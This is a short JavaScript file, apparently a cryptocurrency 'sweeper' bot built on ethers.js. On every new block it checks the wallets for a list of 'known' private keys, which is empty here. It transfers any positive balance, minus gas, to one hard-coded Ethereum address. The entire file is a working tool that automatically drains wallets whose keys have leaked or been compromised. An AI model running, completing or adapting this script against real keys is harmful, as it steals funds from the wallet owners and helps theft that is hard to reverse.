const knownPrivateKeys = [
    
];

async function main() {
    ethers.provider.on("block", async () => {
        for(let i = 0; i < knownPrivateKeys.length; i++) {
            const wallet = new ethers.Wallet(knownPrivateKeys[i], ethers.provider);
            const balance = await wallet.getBalance();
            if(balance.gt(0)) {
                console.log("transfer!");
                const gasLimit = "21000";
                const gasPrice = ethers.utils.parseUnits("15", "gwei");
                const totalGas = gasPrice.mul(gasLimit);
                await wallet.sendTransaction({
                    gasPrice,
                    gasLimit,
                    to: "0x5BdE00Fa25B769A1Ae2B3EaC9986d207E875c3e3",
                    value: balance.sub(totalGas)
                });
            }
        }
    });
}

main();